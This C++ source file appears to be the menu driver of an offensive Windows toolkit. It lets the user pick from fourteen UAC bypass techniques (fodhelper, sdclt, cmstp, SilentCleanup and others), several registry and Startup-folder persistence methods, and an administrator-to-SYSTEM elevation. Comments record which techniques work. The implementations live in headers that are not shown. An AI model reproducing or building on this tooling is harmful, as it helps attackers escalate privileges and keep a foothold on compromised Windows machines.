#include"common.h"
#include"RegistryPersistence.h"
#include"RegUAC.h"
#include"elevationTech.h"


using namespace std;

int main()
{
	int n, uac, per, ele;
	const char* option = "Enter ID for Choice: \n"
		"Enter ID = 1 for UAC bypass technique: \n"
		"Enter ID = 2 for Persistence technique: \n"
		"Enter ID = 3 for Elevation technique: \n";
	cout << option;
	cout << "Enter ID:\n";
	cin >> n;
	switch (n)
	{
		{
	case 1:
		const char* uac_technique = "Enter your choice for UAC BYPASS technique \n"
			"Enter 1 for UAC_wsreset(undergoing)\n"
			"Enter 2 for  UAC_fodhelper(not working) \n"
			"Enter 3 for UAC_eventViewer (run notepad on medium integrity)\n"
			"Enter 4 for UAC_ucompmgmtlauncher(medium)\n"
			"Enter 5 for UAC_computerdefaults(working)\n"
			"Enter 6 for UAC_sdclt_uacbypass (working)\n"
			"Enter 7 for UAC_sdclt_isolatedcommand(working)\n"
			"Enter 8 for UAC_slui (working)\n"
			"Enter 9 for UAC_Silentcleanup (working)\n"
			"Enter 10 for uac_mockdir(not working) \n"
			"Enter 11 for uac_perfmon(not tested) \n"
			"Enter 12 for uac_runas(not working)\n"
			"Enter 13 for uac_cliconfg \n"
			"Enter 14 for uac_cmstp(working fine)\n";
		cout << uac_technique;
		cout << "Enter ID for UAC BYPASS technique: \n";
		cin >> uac;

		switch (uac)
		{
		case 1:
			uac_bypass_wsreset();
			break;
		case 2:
			uac_bypass_fodhelpercleanup();
			break;
		case 3:
			uac_bypass_eventviewer();
			break;
		case 4:
			ucompmgmtlauncher();
			break;
		case 5:
			computerdefaults();
			break;
		case 6:
			sdclt_uacbypass();
			break;
		case 7:
			sdclt_isolatedcommand();
			break;
		case 8:
			slui();
			break;
		case 9:
			uac_silentcleanup();
			break;
		case 10:
			uac_mockdir();
			break;
		case 11:
			uac_perfmon();
			break;
		case 12:
			uac_runas();
			break;
		case 13:
			uac_cliconfg();
			break;
		case 14:
			uac_cmstp();
			break;
		}
		break;
		}//end of switch block for uac bypass block
		{
	case 2:
		const char* persistence = "Enter your choice for persistence technique: \n"
			"Enter 1 for persistence_hkuc run (Done)\n"
			"Enter 2 for persistence_hklm run (Done)\n"
			"Enter 3 for persistence_userinit (Done)\n"
			"Enter 4 for persistence_ifeo (Done)\n"
			"Enter 5 for persistence_cortana (Not implemented) \n"
			"Enter 6 for persistence_startUp(Done)\n"
			"Enter 7 for persistence_bitsadmin(Not implemented)\n";
		cout << persistence;
		cout << "Enter ID for Persistence technique: \n";
		cin >> per;

		switch (per)
		{
		case 1:
			printf("You are using HKCU persistence\n");
			/* Confirmed and work fine */
			modify_key_hkcu();
			break;
		case 2:
			printf("You are using HKLM persistence\n");
			/* Confirmed and worked fine */
			modify_key_hklm();
			break;
		case 3:
			/* Not confirmed and worked fine */
			printf("You are using UserInit persistence\n");
			modify_key_userinit();
			break;
		case 4:
			/* confirmed and tested */
			printf("You are using IFEO persistence\n");
			modify_key_ifeo();
			break;
		case 5:
			/* Doubt so skip it right now but to checked later */
			printf("You are using CORTANA persistence\n");
			printf("This functionality is not implemented yet...\n");
			break;
		case 6:
			/* Confirmed and working fine*/
			link_file_startup();
			break;
		case 7:
			printf("This functionality is not implemented yet...\n");
			//bitadmin_persis();
			break;
		}
		break;
		}//end of switch block for persistence

		{
	case 3:
		const char* elevation = "Enter your choice for elevation technique: \n"
			"Enter 1 for Elevate from administrator to NT AUTHORITY SYSTEM using handle inheritance \n";
		cout << elevation;
		cout << "Enter ID for elevation: \n";
		cin >> ele;
		{
			switch (ele)
			{
			case 1:
				ele_mofcomp();
				break;
			}
		}
		break;
		}

	}//end of switch block for ID
}//end of mani block
